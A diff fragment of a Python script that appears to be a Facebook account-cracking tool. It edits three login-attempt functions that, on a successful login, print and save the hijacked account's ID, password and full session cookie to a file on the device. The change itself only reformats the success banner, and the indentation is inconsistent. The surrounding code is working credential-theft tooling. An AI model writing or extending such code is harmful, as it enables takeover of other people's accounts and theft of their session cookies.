@@ -381,12 +381,8 @@ def a(uid,pwx,tl):
             if 'c_user' in log_cookies:
                 coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                 cid = coki[65:80]
-		logo=("""\033[92;1m
-                \33[1;91m [𝐅𝐈𝐑𝐄-𝗢𝗞]╔════════════════════════════════════════╗
-                          \33[1;91m║  '+cid+' | '+ps+'\33[0;92m')                                        print(f'\r\33[1;91m║
-                          \33[1;91m║                                        ║ 
-                          \33[1;91m [𝐍𝐔𝐌𝐁𝐄𝐑]║  {uid}')                                       print(f'\r\33[1;91m║ 
-                          \33[1;91m╚════════════════════════════════════════╝,,,
+                print(f'\r\33[1;91m [ 𝐅𝐈𝐑𝐄-𝗢𝗞 ] '+cid+' | '+ps+'\33[0;91m')
+                print(f'\r\33[1;91m [🔢] Number : {uid}')
                 print(f'\r\033[1;92m [♥] COOKIE : '+coki)
                 oks.append(cid)
                 
@@ -453,12 +449,8 @@ def b(uid,pwx,tl):
             if 'c_user' in log_cookies:
                 coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                 cid = coki[65:80]
-		logo=("""\033[92;1m
-                \33[1;91m [𝐅𝐈𝐑𝐄-𝗢𝗞]╔════════════════════════════════════════╗
-                          \33[1;91m║  '+cid+' | '+ps+'\33[0;92m')                                        print(f'\r\33[1;91m║
-                          \33[1;91m║                                        ║ 
-                          \33[1;91m [𝐍𝐔𝐌𝐁𝐄𝐑]║  {uid}')                                       print(f'\r\33[1;91m║ 
-                          \33[1;91m╚════════════════════════════════════════╝,,,
+		print(f'\r\33[1;91m [ 𝐅𝐈𝐑𝐄-𝗢𝗞 ] '+cid+' | '+ps+'\33[0;91m')
+                print(f'\r\33[1;91m [🔢] Number : {uid}')
                 print(f'\r\033[1;92m [♥] COOKIE : '+coki)
                 oks.append(cid)
                 open('/sdcard/𝐅𝐈𝐑𝐄-𝐎𝐊.𝐭𝐱𝐭', 'a').write(cid+' | '+ps+' | '+uid+'\n')
@@ -513,12 +505,8 @@ def c(uid,pwx,tl):
             if 'c_user' in log_cookies:
                 coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                 cid = coki[65:80]
-	        logo=("""\033[92;1m
-                print(f'\r\33[1;91m [𝐅𝐈𝐑𝐄-𝗢𝗞]╔════════════════════════════════════════╗
-                print(f'\r\33[1;91m║  '+cid+' | '+ps+'\33[0;92m')                                        print(f'\r\33[1;91m║
-                print(f'\r\33[1;91m║                                        ║ 
-                print(f'\r\33[1;91m [𝐍𝐔𝐌𝐁𝐄𝐑]║  {uid}')                                       print(f'\r\33[1;91m║ 
-                print(f'\r\33[1;91m╚════════════════════════════════════════╝
+	        print(f'\r\33[1;91m [ 𝐅𝐈𝐑𝐄-𝗢𝗞 ] '+cid+' | '+ps+'\33[0;91m')
+                print(f'\r\33[1;91m [🔢] Number : {uid}')
                 #print(f'\r\033[1;92m [🍪] COOKIE : '+coki)
                 cek_apk(session,coki)
                 oks.append(cid)
